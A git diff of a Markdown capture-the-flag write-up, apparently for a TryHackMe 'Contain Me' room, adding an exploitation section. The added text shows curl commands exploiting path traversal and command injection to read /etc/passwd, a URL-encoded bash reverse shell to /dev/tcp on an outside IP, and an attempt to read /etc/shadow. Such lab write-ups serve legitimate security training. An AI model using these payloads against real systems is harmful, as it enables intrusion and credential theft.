@@ -1,5 +1,5 @@
 ---
-{"dg-publish":true,"permalink":"/try-hack-me-rooms/contain-me/","created":"2026-04-02T15:14:28.705+02:00","updated":"2026-04-02T16:59:41.838+02:00","dg-note-properties":{}}
+{"dg-publish":true,"permalink":"/try-hack-me-rooms/contain-me/","created":"2026-04-02T15:14:28.705+02:00","updated":"2026-04-02T22:48:38.821+02:00","dg-note-properties":{}}
 ---
 
 ![](/img/user/Attachments/redteaming2.png)
@@ -142,6 +142,53 @@ Interesting endpoints are found via ffuf.
 2. index.php
 3. index.html
 
+The source code for **index.php** shows the output of **ls -la** command 
+
+![](/img/user/Attachments/html-comment-indexpage.png)
+
+## Exploitation
+
+Executing the command in the terminal
+`curl "http://10.112.132.114/index.php?path=../../../../../etc/passwd"`
+
+![](/img/user/Attachments/wtf.png)
+
+This suggest there is a LFI-vulnerability present.  Running basic BASH commands like `whoami` `ls` `pwd` doesnt produce any results. However injecting a path into the url-parameter does produce something worthwhile. 
+
+Perhaps the intended attack path is LFI or Command Injection. Lets try a payload.
+
+`curl "http://10.112.132.114/index.php?path=../../../../../etc/passwd;id"`
+
+![](/img/user/Attachments/Ci-confirmed.png)
+
+Let's play around and see how far we can push it. 
+
+URL-encoding the **payload** allows me to read the **/etc/passwd**
+
+```
+curl "http://10.112.132.114/index.php?path=../../../../etc/passwd;cat%20..%2F..%2F..%2F..%2Fetc%2Fpasswd"
+```
+
+![](/img/user/Attachments/url-encodedpayload.png)
+
+
+So we have a user named **mike**. Lets see if we can URL-encode a payload to execute a reverse shell
+
+```
+curl "http://10.112.132.114/index.php?path=../../../../etc/passwd;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.141.140%2F9999%200%3E%261"
+```
+
+This did not work... Could be due to netcat not being on the system. I checked and the payload for checking if it is present did not yield anything. 
+
+Checking if I can read /etc/shadow... No luck. 
+
+```
+curl "http://10.112.132.114/index.php?path=../../../../etc/passwd;cat%20%2Fetc%2Fshadow1"
+```
+
+So far it seems that the only payload which works is the payload to read /etc/passwd. 
+
+
 **info.php**
 
 ![](/img/user/Attachments/info.php.png)
@@ -153,10 +200,10 @@ Let's see if there are any exploits available for this particular PHP version
 Using searchsploit to search for anything ....
 `searchsploit php 7.2`
 
-![](/img/user/Attachments/searchsploit.png)
 
 
-## Exploitation
+
+
 
 ## Post-exploitation
 
